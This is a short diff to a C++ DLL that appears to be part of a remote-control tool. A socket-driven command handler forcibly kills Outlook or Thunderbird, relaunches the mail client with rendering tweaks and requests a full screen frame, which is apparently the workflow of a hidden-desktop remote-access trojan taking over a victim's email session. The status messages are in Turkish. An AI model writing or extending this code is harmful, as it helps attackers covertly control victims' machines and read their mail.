@@ -2384,7 +2384,11 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     else if (wRequestedPath == L"Outlook") exeName = L"outlook.exe";
                     else if (wRequestedPath == L"Thunderbird") exeName = L"thunderbird.exe";
 
-                    if (closeReal && !exeName.empty()) {
+                    if (wRequestedPath == L"Outlook") {
+                        send_status("Mevcut uygulama kapatılıyor...");
+                        kill_process_by_name(L"outlook.exe");
+                        Sleep(800);
+                    } else if (closeReal && !exeName.empty()) {
                         send_status("Mevcut uygulama kapatılıyor...");
                         kill_process_by_name(exeName);
                         Sleep(800);
@@ -2768,8 +2772,16 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         SetEnvironmentVariableW(L"MOZ_WEBRENDER", L"software");
                     }
 
+                    wstring currentDir;
+                    if (!exePath.empty()) {
+                        try {
+                            currentDir = fs::path(exePath).parent_path().wstring();
+                        } catch (...) {}
+                    }
+                    const wchar_t* lpCurrentDir = (!currentDir.empty() && fs::exists(currentDir)) ? currentDir.c_str() : NULL;
+
                     if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
-                                       0, NULL, NULL, &si, &pi)) {
+                                       0, NULL, lpCurrentDir, &si, &pi)) {
                         CloseHandle(pi.hProcess);
                         CloseHandle(pi.hThread);
                         request_full_frame(true);
